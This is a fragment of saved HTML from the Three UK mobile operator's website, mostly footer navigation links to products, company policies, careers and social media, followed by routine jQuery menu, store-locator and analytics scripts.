<!-- 

 -->




<a href="/iphone/iphone-11-pro-max" data-enhance="false" title=""""><!--|cid=1400731553279|type=ThreeWeb_C|-->iPhone 11 Pro Max.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->


				
			</dd>
		</dl>

                <dl class="products">
		<dt>Popular products.</dt>
		<dd>
                


<a href="//www.three.co.uk/iPhone" data-enhance="false" title="iPhone."><!--|cid=1220493438618|type=ThreeWeb_C|-->iPhone.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/Samsung" data-enhance="false" title="Samsung."><!--|cid=1400641262761|type=ThreeWeb_C|-->Samsung.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="/honor" data-enhance="false" title="Honor."><!--|cid=1400692260234|type=ThreeWeb_C|-->Honor.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/huawei" data-enhance="false" title="Huawei."><!--|cid=1400641263728|type=ThreeWeb_C|-->Huawei.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->


		
		</dd>
		</dl>	

		<dl class="company">
			<dt>Our company.</dt>
			<dd>
				


<a href="//www.three.co.uk/About_Three" data-enhance="false" title="About Three."><!--|cid=1220489858067|type=ThreeWeb_C|-->About Three.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/terms-conditions" data-enhance="false" title="Terms & Conditions."><!--|cid=1400579138620|type=ThreeWeb_C|-->Terms & Conditions.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="/business" data-enhance="false" title="Business."><!--|cid=1220489858091|type=ThreeWeb_C|-->Business.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/terms-conditions/code-of-practice" data-enhance="false" title="Code of practice."><!--|cid=1400579138548|type=ThreeWeb_C|-->Code of practice.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="/wholesale" data-enhance="false" title=""""><!--|cid=1400579138491|type=ThreeWeb_C|-->Wholesale.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="/ModernSlaveryStatement" data-enhance="false" title="Modern Slavery Statement."><!--|cid=1400672193545|type=ThreeWeb_C|-->Modern Slavery Statement.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="/terms-conditions/genderpay" data-enhance="false" title="Gender Pay Gap Report."><!--|cid=1400694657905|type=ThreeWeb_C|-->Gender Pay Gap Report.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="https://jobs.three.co.uk/" data-enhance="false" title="Careers."><!--|cid=1220489932541|type=ThreeWeb_C|-->Careers.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/Privacy_Cookies/Accessibility" data-enhance="false" title="Accessibility."><!--|cid=1400579138238|type=ThreeWeb_C|-->Accessibility.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/Contact_us" data-enhance="false" title="Contact us."><!--|cid=1220489932514|type=ThreeWeb_C|-->Contact us.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="http://support.three.co.uk/SRVS/CGI-BIN/WEBISAPI.DLL?Command=New,Kb=Mobile,Ts=Mobile,T=Article,varset_cat=billing,varset_subcat=3768,Case=obj(42823)" data-enhance="false" title="Vulnerable Customer Policy."><!--|cid=1400709808921|type=ThreeWeb_C|-->Vulnerable Customer Policy.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="http://www.threemediacentre.co.uk/" data-enhance="false" title="Media Centre."><!--|cid=1400642446744|type=ThreeWeb_C|-->Media Centre.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="/privacy_safety" data-enhance="false" title=""""><!--|cid=1220489932384|type=ThreeWeb_C|-->Privacy & Safety.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/Three_price_guide" data-enhance="false" title="Price Guide."><!--|cid=1220489932308|type=ThreeWeb_C|-->Price Guide.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/delivery" data-enhance="false" title="Delivery Information."><!--|cid=1400608963313|type=ThreeWeb_C|-->Delivery Information.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="https://smarty.co.uk" data-enhance="false" title=""""><!--|cid=1400720807420|type=ThreeWeb_C|-->SMARTY</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.three.co.uk/sitemap" data-enhance="false" title="Sitemap."><!--|cid=1400627023287|type=ThreeWeb_C|-->Sitemap.</a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->


				
			</dd>
		</dl>

		<dl class="social">
			
			<dd>
				


<a href="//www.facebook.com/ThreeUK" data-enhance="false" rel="nofollow"><!--|cid=1400579138757|type=ThreeWeb_C|--><i class="icon-facebook" aria-hidden="true"></i><span></span></a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//twitter.com/threeuk" data-enhance="false" rel="nofollow"><!--|cid=1400579139454|type=ThreeWeb_C|--><i class="icon-twitter" aria-hidden="true"></i><span></span></a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//www.youtube.com/user/three" data-enhance="false" rel="nofollow"><!--|cid=1400579139816|type=ThreeWeb_C|--><i class="icon-youtube" aria-hidden="true"></i><span></span></a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->




<a href="//instagram.com/threeuk/" data-enhance="false" rel="nofollow"><!--|cid=1400579139614|type=ThreeWeb_C|--><i class="icon-instagram" aria-hidden="true"></i><span></span></a>
<!--rendersthe attribute ThreeWebListItemBody -->
<!-- 

 -->


				
			</dd>
		</dl>
		<p role="contentinfo">&copy; Hutchison 3G UK Limited 2002 - Present.</p>
	</nav>
</footer>


<script>
$(function() {
	$('#site-links').on('click','dt',function(){
		if($(this).closest('dl').hasClass('social')){
			return
		}
		if($(this).closest('dl').hasClass('active')){
			$(this).closest('dl').removeClass('active');
		} else {
			$('#site-links dl').removeClass('active');
			$(this).closest('dl').addClass('active');
		}
	})
})


$(document).ready(function() {
  $('#storeLocatorForm').on('submit', function(e) {
    e.preventDefault();
    submitSearchForm(e, '#storeLocator', 'https://locator.three.co.uk/search/?q=');
  })
});

</script><!--[if gte IE 9]><!--><script src="index_files/hammer.min.js"></script><script src="index_files/jquery.hammer.min.js"></script><!--<![endif]--><script src="index_files/base2.min.js"></script><script src="index_files/responsive.min.js"></script><script src="index_files/aria-carousel.min.js"></script><script src="index_files/s_code.js"></script><script>for(var p in pre)if(pre.hasOwnProperty(p))s[p]=pre[p];var s_code=s.t();if(s_code)document.write(s_code)</script><script>_satellite.pageBottom()</script></body></html>